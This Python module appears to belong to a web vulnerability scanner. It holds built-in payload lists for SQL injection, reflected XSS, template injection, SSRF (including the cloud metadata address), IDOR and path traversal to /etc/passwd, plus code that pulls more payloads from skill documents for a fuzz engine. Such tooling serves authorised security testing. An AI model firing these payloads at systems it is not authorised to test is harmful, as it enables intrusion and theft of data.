"""Payload Corpus — turn indexed skills into executable probe corpora.

Skills currently carry attack knowledge as prose. This engine extracts
executable payloads from skill bodies (quoted strings, code spans, template
markers) AND provides curated built-in corpora per vulnerability class,
then lets the fuzz engine request payloads by technique instead of using
a single hardcoded list. Coverage is tracked per technique so runs are
measurable and skills genuinely drive execution.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Dict, List, Set

QUOTE_RE = re.compile(r'["\'`]([^"\'`\n]{3,120})["\'`]')
CODE_RE = re.compile(r'```(?:[a-z]+)?\n([^`]{3,400})```')

BUILTIN_CORPORA: Dict[str, List[str]] = {
    "sqli-error": ["'", "\"", "1'", "1\"", "%27", "1' OR '1'='1", "1) OR (1=1"],
    "sqli-blind-time": [
        "1' AND SLEEP(2)-- -", "1\"; SELECT pg_sleep(2)-- -",
        "1' WAITFOR DELAY '0:0:2'-- -", "1) AND (SELECT 1 FROM (SELECT(SLEEP(2)))x)-- -",
    ],
    "xss-reflected": ["'<r3d0ps>", "r3d0ps'\"<>", "<svg/onload=r3d0ps>",
                      "\"><img src=x onerror=r3d0ps>", "javascript:r3d0ps"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "#{7*7}", "*{7*7}"],
    "ssrf": ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
             "http://[::1]/", "http://0177.0.0.1/"],
    "idor": ["1", "2", "0", "999999", "00000000-0000-0000-0000-000000000001"],
    "path-traversal": ["../../etc/passwd", "..%2f..%2fetc%2fpasswd",
                       "....//....//etc/passwd", "/etc/passwd%00"],
}

SSTI_MARKERS = {"49": "{{7*7}}", "49.0": "${7*7}"}


@dataclass
class TechniqueCorpus:
    technique: str
    payloads: List[str] = field(default_factory=list)
    source: str = "builtin"  # builtin | skill
    used: Set[str] = field(default_factory=set)

    @property
    def coverage(self) -> float:
        return len(self.used) / len(self.payloads) if self.payloads else 0.0


class PayloadCorpus:
    def __init__(self):
        self.corpora: Dict[str, TechniqueCorpus] = {
            name: TechniqueCorpus(technique=name, payloads=list(pl))
            for name, pl in BUILTIN_CORPORA.items()
        }

    # ---------------- skill-driven extraction ----------------
    def load_from_skills(self, skills) -> int:
        """Extract executable-looking payloads from skill prose."""
        added = 0
        for skill in skills:
            text = ""
            try:
                text = open(skill.file_path, encoding="utf-8", errors="ignore").read()
            except OSError:
                continue
            technique = self._classify(skill)
            if not technique:
                continue
            corpus = self.corpora.setdefault(
                technique, TechniqueCorpus(technique=technique, source="skill"))
            corpus.source = "skill"
            for raw in CODE_RE.findall(text):
                for line in raw.splitlines():
                    line = line.strip()
                    if self._looks_like_payload(technique, line) and line not in corpus.payloads:
                        corpus.payloads.append(line)
                        added += 1
        return added

    @staticmethod
    def _classify(skill) -> str:
        name = (skill.name + " " + " ".join(skill.tags)).lower()
        if "sqli" in name or "sql-injection" in name:
            return "sqli-error"
        if "xss" in name or "cross-site" in name:
            return "xss-reflected"
        if "ssti" in name or "template" in name:
            return "ssti"
        if "ssrf" in name:
            return "ssrf"
        if "idor" in name or "bola" in name:
            return "idor"
        if "traversal" in name or "lfi" in name:
            return "path-traversal"
        return ""

    @staticmethod
    def _looks_like_payload(technique: str, line: str) -> bool:
        if not (2 < len(line) < 200) or line.startswith(("#", "//", "import ", "def ")):
            return False
        markers = {
            "sqli-error": ["'", "OR ", "UNION", "SLEEP", "--"],
            "xss-reflected": ["<", "onerror", "onload", "javascript:"],
            "ssti": ["{{", "${", "<%="],
            "ssrf": ["http://", "169.254", "127.0.0.1"],
            "path-traversal": ["../", "..%2f", "/etc/passwd"],
        }
        return any(m.lower() in line.lower() for m in markers.get(technique, []))

    # ---------------- consumption ----------------
    def payloads_for(self, technique: str, limit: int = 10) -> List[str]:
        corpus = self.corpora.get(technique)
        if not corpus:
            return []
        fresh = [p for p in corpus.payloads if p not in corpus.used]
        chosen = fresh[:limit] or corpus.payloads[:limit]
        corpus.used.update(chosen)
        return chosen

    def techniques(self) -> List[str]:
        return list(self.corpora.keys())

    def coverage_report(self) -> Dict[str, Dict[str, object]]:
        return {name: {"payloads": len(c.payloads), "used": len(c.used),
                       "coverage": round(c.coverage, 3), "source": c.source}
                for name, c in self.corpora.items()}


payload_corpus = PayloadCorpus()
